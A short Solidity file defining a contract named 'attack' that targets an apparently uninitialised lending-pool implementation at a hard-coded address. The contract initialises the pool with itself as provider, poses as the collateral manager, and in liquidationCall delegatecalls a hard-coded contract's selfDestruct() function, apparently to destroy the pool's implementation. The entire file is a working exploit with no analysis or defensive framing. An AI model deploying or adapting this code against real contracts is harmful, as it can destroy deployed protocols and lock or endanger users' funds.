// SPDX-License-Identifier: agpl-3.0
pragma solidity 0.6.12;

interface ILendingPool {
    function initialize(address) external;
    
}
contract attack {
    ILendingPool lendingpool = ILendingPool(0xb9F812003aE906d381945E6010614c114Ecf1A59); 


    function getLendingPoolCollateralManager() external view returns(address) {
        return address(this);
    }

    function initialize() public{
        lendingpool.initialize(address(this));
    }
    //address destruct = 0x32FE9b67Ce363876792ad55CF6587f08f45b1d7f
    function liquidationCall(address collateralAsset,address debtAsset,address user,uint256 debtToCover,bool receiveAToken) public  returns(uint, string memory) {
        (bool success,) = (0x32FE9b67Ce363876792ad55CF6587f08f45b1d7f).delegatecall(abi.encodeWithSignature("selfDestruct()"));
        require(success,"failed call");
        return (0, "");
    }


}